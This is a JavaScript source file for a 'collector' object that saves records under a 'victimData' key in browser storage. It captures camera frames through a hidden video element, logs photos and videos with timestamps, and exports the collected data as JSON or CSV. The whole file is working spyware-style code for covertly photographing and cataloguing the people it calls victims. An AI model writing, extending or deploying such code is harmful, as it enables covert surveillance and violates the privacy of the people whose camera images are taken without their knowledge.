javascript
const collector = {
    // Save data to localStorage
    saveData: function(data) {
        try {
            const existingData = JSON.parse(localStorage.getItem('victimData') || '[]');
            existingData.push(data);
            localStorage.setItem('victimData', JSON.stringify(existingData));
            console.log('Data saved locally:', data);
        } catch (error) {
            console.error('Error saving data:', error);
        }
    },

    // Get all collected data
    getAllData: function() {
        try {
            const data = localStorage.getItem('victimData');
            return data ? JSON.parse(data) : [];
        } catch (error) {
            console.error('Error getting data:', error);
            return [];
        }
    },

    // Clear all data
    clearData: function() {
        localStorage.removeItem('victimData');
        console.log('All data cleared');
    },

    // Capture photo from camera
    capturePhoto: function() {
        return new Promise((resolve, reject) => {
            // Check if camera is available
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                reject(new Error('Camera not supported'));
                return;
            }

            // Create video element for camera preview
            const video = document.createElement('video');
            video.style.display = 'none';
            document.body.appendChild(video);

            // Get camera stream
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    video.play();

                    // Wait for video to load
                    video.onloadedmetadata = () => {
                        // Create canvas to capture image
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');

                        // Draw current video frame
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // Get image data as base64
                        const imageData = canvas.toDataURL('image/jpeg', 0.8);

                        // Stop video stream
                        stream.getTracks().forEach(track => track.stop());

                        // Remove video element
                        document.body.removeChild(video);

                        resolve(imageData);
                    };
                })
                .catch(error => {
                    document.body.removeChild(video);
                    reject(error);
                });
        });
    },

    // Save photo data
    savePhoto: function(photoData, metadata = {}) {
        const photoRecord = {
            type: 'photo',
            timestamp: new Date().toISOString(),
            data: photoData,
            metadata: metadata
        };
        this.saveData(photoRecord);
    },

    // Save video recording
    saveVideo: function(videoData, metadata = {}) {
        const videoRecord = {
            type: 'video',
            timestamp: new Date().toISOString(),
            data: videoData,
            metadata: metadata
        };
        this.saveData(videoRecord);
    },

    // Get all photos
    getAllPhotos: function() {
        const allData = this.getAllData();
        return allData.filter(item => item.type === 'photo');
    },

    // Get all videos
    getAllVideos: function() {
        const allData = this.getAllData();
        return allData.filter(item => item.type === 'video');
    },

    // Export data
    exportData: function(format = 'json') {
        const data = this.getAllData();

        switch(format) {
            case 'json':
                return JSON.stringify(data, null, 2);
            case 'csv':
                return this.toCSV(data);
            default:
                return JSON.stringify(data, null, 2);
        }
    },

    // Convert to CSV
    toCSV: function(data) {
        if (data.length === 0) return '';

        // Get all unique keys
        const allKeys = new Set();
        data.forEach(item => {
            Object.keys(item).forEach(key => allKeys.add(key));
        });

        const headers = Array.from(allKeys).join(',');
        const rows = data.map(item =>
            Array.from(allKeys).map(key => {
                const value = item[key];
                return typeof value === 'string' ? `"${value.replace(/"/g, '""')}"` : value;
            }).join(',')
        );
        return [headers, ...rows].join('\n');
    }
};
